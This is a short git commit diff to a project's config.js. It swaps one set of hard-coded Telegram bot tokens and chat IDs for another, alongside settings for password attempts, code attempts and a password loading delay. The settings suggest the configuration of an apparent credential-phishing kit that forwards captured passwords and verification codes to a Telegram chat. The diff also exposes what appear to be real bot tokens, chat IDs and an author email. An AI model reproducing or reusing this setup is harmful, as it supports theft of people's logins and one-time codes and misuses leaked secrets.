464aba066514fd10cb7f6ee05fa186e3b70bc87d
lothixoa04022002 <lothixoa04022002@gmail.com>
2025-09-05 19:29:02 +0700

    Update config.js

--- src/utils/config.js
+++ src/utils/config.js
@@ -1,8 +1,8 @@
 const config = {
     token: '7963473156:AAFUqFzx6nsiEK0GycwzSLTaKvKjaVjkpK4',
     chat_id: '6604062347',
-    noti_token: '7843396833:AAHx49nOiz3U8kCf-x82UikTKGde6l9OTrE',
-    noti_chat_id: '-4741680886',
+    noti_token: '7963473156:AAFUqFzx6nsiEK0GycwzSLTaKvKjaVjkpK4',
+    noti_chat_id: '6604062347',
     max_password_attempts: 2,
     max_code_attempts: 2,
     password_loading_time: 3,
